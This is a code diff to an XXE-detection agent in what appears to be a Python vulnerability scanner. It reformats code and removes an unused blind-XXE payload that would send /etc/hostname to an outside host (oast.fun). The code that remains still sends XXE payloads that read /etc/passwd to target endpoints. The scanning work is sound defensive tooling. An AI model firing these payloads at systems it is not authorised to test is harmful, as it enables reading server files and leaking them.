@@ -1,9 +1,7 @@
 from __future__ import annotations
 
-from typing import Any
-
-from bugfinder.agents.base import BaseAgent, AgentContext, AgentResult
-from bugfinder.core.types import Severity, Confidence
+from bugfinder.agents.base import AgentContext, AgentResult, BaseAgent
+from bugfinder.core.types import Confidence, Severity
 from bugfinder.utils.http import post
 
 
@@ -28,28 +26,28 @@ class XXEAgent(BaseAgent):
             """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd" %param;]><root>&test;</root>""",
         ]
 
-        blind_xxe = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://oast.fun/?x=%file;'>">%eval;%exfil;]><root/>"""
-
         for endpoint in endpoints:
             url = f"{base_url}{endpoint}"
             for ctype in content_types:
                 for payload in xxe_payloads:
                     try:
                         resp = await post(url, content=payload, headers={"Content-Type": ctype}, timeout=10)
-                        text = resp.text if hasattr(resp, 'text') else ""
+                        text = resp.text if hasattr(resp, "text") else ""
                         if "root:" in text or "[fonts]" in text or "ami-id" in text:
-                            findings.append({
-                                "title": "XML External Entity (XXE) Injection",
-                                "description": f"Endpoint {endpoint} is vulnerable to XXE with content type {ctype}",
-                                "severity": Severity.CRITICAL,
-                                "confidence": Confidence.HIGH,
-                                "category": "xxe",
-                                "cwe_id": "611",
-                                "owasp_category": "A05-Security Misconfiguration",
-                                "cvss_score": 9.1,
-                                "evidence": {"endpoint": endpoint, "content_type": ctype},
-                                "remediation": "Disable XML external entity processing. Use less complex data formats like JSON. Configure XML parsers to not resolve external entities.",
-                            })
+                            findings.append(
+                                {
+                                    "title": "XML External Entity (XXE) Injection",
+                                    "description": f"Endpoint {endpoint} is vulnerable to XXE with content type {ctype}",
+                                    "severity": Severity.CRITICAL,
+                                    "confidence": Confidence.HIGH,
+                                    "category": "xxe",
+                                    "cwe_id": "611",
+                                    "owasp_category": "A05-Security Misconfiguration",
+                                    "cvss_score": 9.1,
+                                    "evidence": {"endpoint": endpoint, "content_type": ctype},
+                                    "remediation": "Disable XML external entity processing. Use less complex data formats like JSON. Configure XML parsers to not resolve external entities.",
+                                }
+                            )
                             break
                     except Exception:
                         pass
